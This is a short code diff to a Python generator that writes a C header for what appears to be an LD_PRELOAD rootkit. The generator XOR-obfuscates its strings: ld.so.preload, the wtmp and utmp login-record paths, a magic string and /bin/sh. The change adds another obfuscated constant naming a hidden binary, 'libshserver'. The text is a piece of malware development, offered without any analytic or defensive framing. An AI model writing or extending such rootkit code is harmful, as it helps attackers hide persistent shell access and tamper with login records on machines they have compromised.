@@ -23,6 +23,7 @@ header_template = '''#define _GNU_SOURCE
 
 #define MAGIC_STRING\t"{magic_string}"
 #define CONFIG_FILE\t"{config_file}"
+#define BIN_FILE\t"{bin_file}"
 #define WTMP_FILE_X\t"{wtmp_file}"
 #define UTMP_FILE_X\t"{utmp_file}"
 #define SYS_WRITE\t"{sys_write}"
@@ -85,6 +86,7 @@ syscalls = [
 header = header_template.format(
     magic_string="__",
     config_file=xor("ld.so.preload"),
+    bin_file=xor("libshserver"),
     wtmp_file=xor("/var/log/wtmp"),
     utmp_file=xor("/var/run/utmp"),
     shell_type=xor("/bin/sh"),
